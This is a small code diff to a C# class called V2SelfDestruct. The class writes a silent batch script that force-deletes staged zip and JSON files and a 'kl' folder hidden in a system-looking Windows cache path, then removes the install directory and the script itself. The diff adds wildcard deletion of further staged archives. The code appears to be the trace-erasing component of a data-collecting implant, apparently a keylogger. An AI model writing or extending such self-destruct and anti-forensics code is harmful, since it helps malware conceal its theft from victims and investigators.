@@ -49,6 +49,9 @@ public static class V2SelfDestruct
                 "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.pending.zip\" >nul 2>&1\r\n" +
                 "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.pending.json\" >nul 2>&1\r\n" +
                 "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.auto.json\" >nul 2>&1\r\n" +
+                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.pending.zip\" >nul 2>&1\r\n" +
+                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.pending.json\" >nul 2>&1\r\n" +
+                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.auto.json\" >nul 2>&1\r\n" +
                 "rmdir /s /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\kl\" >nul 2>&1\r\n" +
                 (string.IsNullOrWhiteSpace(installDir) ? "" : $"rmdir /s /q \"{installDir}\" >nul 2>&1\r\n") +
                 $"del /f /q \"{temp}\" >nul 2>&1\r\n";
